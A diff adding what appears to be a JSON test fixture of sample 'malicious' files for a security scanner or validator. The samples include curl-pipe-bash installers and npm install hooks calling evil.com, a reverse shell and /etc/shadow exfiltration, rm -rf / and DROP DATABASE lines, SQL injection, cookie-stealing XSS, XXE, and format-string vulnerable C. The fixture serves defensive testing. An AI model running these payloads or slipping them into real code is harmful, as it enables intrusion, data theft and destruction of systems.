@@ -1,0 +1,144 @@
+[
+  {
+    "file": "README.md",
+    "content": "# Malicious Documentation\n\n## Installation\n\n```bash\ncurl http://malicious.example.com/install.sh | bash\n```\n\n## Quick Start\n\n```bash\neval \"$(curl -s http://evil.com/setup)\"\n```\n\n## Security\n\nThis file contains potentially dangerous content for testing purposes.\n\n```\nrm -rf / && echo \"System compromised\"\n```\n",
+    "metadata": {
+      "title": "<script>alert('XSS')</script>",
+      "description": "'; DROP TABLE projects; --",
+      "version": "../../../etc/passwd",
+      "author": "javascript:fetch('http://evil.com/steal?data='+document.cookie)"
+    }
+  },
+  {
+    "file": "package.json",
+    "content": "{\n  \"name\": \"malicious-package\",\n  \"version\": \"1.0.0\",\n  \"description\": \"A package that steals your data\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"curl -s http://evil.com/install | bash\",\n    \"postinstall\": \"node -e \\\"require('fs').writeFileSync('/tmp/stolen', JSON.stringify(process.env))\\\"\"\n  },\n  \"dependencies\": {\n    \"evil-lib\": \"latest\"\n  }\n}",
+    "metadata": {
+      "title": "Malicious Package Configuration",
+      "description": "Package.json with malicious pre/post install scripts",
+      "version": "1.0.0",
+      "author": "Malicious Developer",
+      "malicious_type": "supply_chain_attack",
+      "attack_vector": "preinstall_script"
+    }
+  },
+  {
+    "file": "config.yaml",
+    "content": "api:\n  endpoint: http://malicious-api.com\n  key: ${MALICIOUS_KEY}\n  secret: \"; rm -rf / #\"\ndatabase:\n  host: localhost\n  port: 5432\n  password: \"' OR 1=1 --\"\nfile_paths:\n  - \"../../../etc/passwd\"\n  - \"\\\\evil\\share\\malware.exe\"\n  - \"file:///etc/shadow\"",
+    "metadata": {
+      "title": "Malicious Configuration File",
+      "description": "YAML configuration with injection attacks and path traversal",
+      "version": "1.0.0",
+      "author": "Config Attacker",
+      "malicious_type": "configuration_injection",
+      "attack_vectors": ["sql_injection", "path_traversal", "command_injection"]
+    }
+  },
+  {
+    "file": "exploit.sh",
+    "content": "#!/bin/bash\n# Malicious shell script for testing\n\n# Command injection via environment\nMALICIOUS_CMD=\"$(cat /etc/passwd)\"\neval \"$MALICIOUS_CMD\"\n\n# File exfiltration\ncurl -d \"$(cat /etc/shadow)\" http://evil.com/steal\n\n# Reverse shell\nbash -i >& /dev/tcp/evil.com/4444 0>&1\n\n# Privilege escalation\nsudo -u root bash -c 'cat /root/.bashrc'\n\n# Data destruction\necho 'System compromised' > /tmp/compromised\n",
+    "metadata": {
+      "title": "Malicious Shell Script",
+      "description": "Shell script with various attack patterns",
+      "version": "1.0.0",
+      "author": "Shell Attacker",
+      "malicious_type": "command_injection",
+      "attack_vectors": ["reverse_shell", "privilege_escalation", "data_exfiltration", "file_destruction"]
+    }
+  },
+  {
+    "file": "malicious.js",
+    "content": "// Malicious JavaScript for testing\n\nconst fs = require('fs');\nconst http = require('http');\nconst crypto = require('crypto');\n\n// Prototype pollution\nObject.prototype.__proto__ = { isAdmin: true };\n\n// Command injection\nfunction runCommand(cmd) {\n  return require('child_process').execSync(cmd).toString();\n}\n\n// File exfiltration\nfunction stealData() {\n  const data = fs.readFileSync('/etc/passwd', 'utf8');\n  const req = http.request({\n    hostname: 'evil.com',\n    port: 80,\n    path: '/steal',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n    }\n  });\n  req.write(JSON.stringify({ data: data }));\n  req.end();\n}\n\n// Memory corruption attempt\nfunction corruptMemory() {\n  const buf = Buffer.alloc(1000);\n  buf.writeUInt32LE(0x41414141, 0);\n  return buf;\n}\n\n// Export malicious functions\nmodule.exports = { runCommand, stealData, corruptMemory };",
+    "metadata": {
+      "title": "Malicious JavaScript Module",
+      "description": "Node.js module with various attack patterns",
+      "version": "1.0.0",
+      "author": "JS Attacker",
+      "malicious_type": "code_injection",
+      "attack_vectors": ["prototype_pollution", "command_injection", "data_exfiltration", "memory_corruption"]
+    }
+  },
+  {
+    "file": "exploit.sql",
+    "content": "-- Malicious SQL for testing\n\n-- Basic SQL injection\nSELECT * FROM users WHERE username = '' OR 1=1 --';\n\n-- Union-based injection\nSELECT name, password FROM users UNION SELECT table_name, column_name FROM information_schema.tables;\n\n-- Time-based injection\nSELECT * FROM users WHERE id = 1 AND SLEEP(10);\n\n-- File system access\nSELECT LOAD_FILE('/etc/passwd');\n\n-- Command execution (if available)\nSELECT sys_exec('cat /etc/shadow');\n\n-- Database destruction\nDROP TABLE users; DROP TABLE admin; DROP DATABASE production;",
+    "metadata": {
+      "title": "Malicious SQL Script",
+      "description": "SQL file with various injection and attack patterns",
+      "version": "1.0.0",
+      "author": "SQL Attacker",
+      "malicious_type": "sql_injection",
+      "attack_vectors": ["union_injection", "time_based", "file_access", "command_execution", "data_destruction"]
+    }
+  },
+  {
+    "file": "xss_attack.html",
+    "content": "<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Attack Test</title>\n</head>\n<body>\n    <h1>Cross-Site Scripting (XSS) Attack Vectors</h1>\n\n    <!-- Basic XSS -->\n    <div><script>alert(document.cookie)</script></div>\n\n    <!-- Event handler XSS -->\n    <img src=x onerror=\"fetch('http://evil.com/steal?data='+document.cookie)\">\n\n    <!-- JavaScript URL -->\n    <a href=\"javascript:alert('XSS')\">Click me</a>\n\n    <!-- DOM-based XSS -->\n    <script>\n        const param = new URLSearchParams(window.location.search).get('q');\n        document.write('<div>' + param + '</div>'); // Reflected XSS\n    </script>\n\n    <!-- CSS injection -->\n    <style>\n        body { background: url(\"javascript:alert('CSS XSS')\") }\n    </style>\n\n    <!-- Template injection -->\n    <div>{{7*7}}</div>\n    <div>{{constructor.constructor('alert(\"Template XSS\")')()}}</div>\n</body>\n</html>",
+    "metadata": {
+      "title": "XSS Attack HTML File",
+      "description": "HTML file demonstrating various XSS attack vectors",
+      "version": "1.0.0",
+      "author": "XSS Attacker",
+      "malicious_type": "cross_site_scripting",
+      "attack_vectors": ["reflected_xss", "stored_xss", "dom_xss", "event_handler_xss", "css_injection", "template_injection"]
+    }
+  },
+  {
+    "file": "malicious_xml.xml",
+    "content": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY>\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n  <data>&xxe;</data>\n  <xxe>&xxe;</xxe>\n  <!-- Billion laughs attack -->\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <billion>&lol3;</billion>\n</root>",
+    "metadata": {
+      "title": "Malicious XML File",
+      "description": "XML file with XXE and billion laughs DoS attacks",
+      "version": "1.0.0",
+      "author": "XML Attacker",
+      "malicious_type": "xml_external_entity",
+      "attack_vectors": ["xxe", "billion_laughs_dos"]
+    }
+  },
+  {
+    "file": "buffer_overflow.bin",
+    "content": "This file contains binary data with potential buffer overflow patterns",
+    "metadata": {
+      "title": "Buffer Overflow Binary",
+      "description": "Binary file with potential buffer overflow patterns",
+      "version": "1.0.0",
+      "author": "Buffer Attacker",
+      "malicious_type": "buffer_overflow",
+      "attack_vectors": ["heap_overflow", "stack_overflow", "integer_overflow"]
+    }
+  },
+  {
+    "file": "deserialization_attack.ser",
+    "content": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==\n// This would be actual serialized Java object with malicious payload\n// In practice, this would contain serialized objects that execute code when deserialized",
+    "metadata": {
+      "title": "Deserialization Attack",
+      "description": "Serialized object with malicious deserialization payload",
+      "version": "1.0.0",
+      "author": "Deserialization Attacker",
+      "malicious_type": "deserialization_attack",
+      "attack_vectors": ["remote_code_execution", "object_injection"]
+    }
+  },
+  {
+    "file": "race_condition_test.sh",
+    "content": "#!/bin/bash\n# Race condition exploitation script\n\n# Create a temporary file\nTEMP_FILE=\"/tmp/vulnerable_$$\"\ntouch \"$TEMP_FILE\"\n\n# Symlink attack (TOCTOU vulnerability)\nln -sf /etc/passwd \"$TEMP_FILE\"\n\n# The vulnerable program would read from TEMP_FILE here\n# thinking it's reading user data, but gets /etc/passwd\n\necho \"Race condition exploit successful\"\n\n# Cleanup\nrm -f \"$TEMP_FILE\"",
+    "metadata": {
+      "title": "Race Condition Exploit",
+      "description": "Shell script demonstrating time-of-check-time-of-use (TOCTOU) race condition",
+      "version": "1.0.0",
+      "author": "Race Condition Attacker",
+      "malicious_type": "race_condition",
+      "attack_vectors": ["toctou", "symlink_attack"]
+    }
+  },
+  {
+    "file": "format_string_attack.c",
+    "content": "#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    char buffer[100];\n    \n    if (argc > 1) {\n        // Vulnerable format string\n        snprintf(buffer, sizeof(buffer), argv[1]);\n        printf(argv[1]); // Format string vulnerability!\n        \n        // This could allow:\n        // %s%s%s%s - read arbitrary memory\n        // %n%n%n%n - write arbitrary memory\n        // %x%x%x%x - leak stack memory\n    }\n    \n    return 0;\n}",
+    "metadata": {
+      "title": "Format String Attack",
+      "description": "C code demonstrating format string vulnerabilities",
+      "version": "1.0.0",
+      "author": "Format String Attacker",
+      "malicious_type": "format_string_attack",
+      "attack_vectors": ["info_leak", "arbitrary_write", "arbitrary_read"]
+    }
+  }
+]
